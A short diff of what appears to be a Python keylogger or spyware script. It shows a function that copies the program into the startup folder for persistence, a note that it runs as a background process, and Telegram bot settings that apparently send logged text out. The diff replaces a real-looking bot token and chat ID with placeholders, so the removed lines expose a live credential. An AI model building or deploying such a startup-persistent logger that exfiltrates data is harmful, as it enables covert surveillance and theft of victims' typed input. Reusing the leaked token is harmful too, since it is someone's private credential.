@@ -17,8 +17,8 @@ current_line = ""  # Buffer for current line of text
 last_log_type = ""  # Track the last type of log entry
 
 # Telegram configuration
-BOT_TOKEN = "8329322792:AAHF6WwNauQjdzZ01YSZhYVo-oL32Qg8JeQ"
-CHAT_ID = "6610574260"  # Your chat ID from the response
+BOT_TOKEN = "TEL_BOT_TOKEN"
+CHAT_ID = "TEL_CHAT_ID"  # Your chat ID from the response
 
 def copy_to_startup():
     """Copy the program to startup folder if not already there"""
@@ -394,4 +394,5 @@ def main():
 
 if __name__ == "__main__":
     # Run as background process
+
     main()
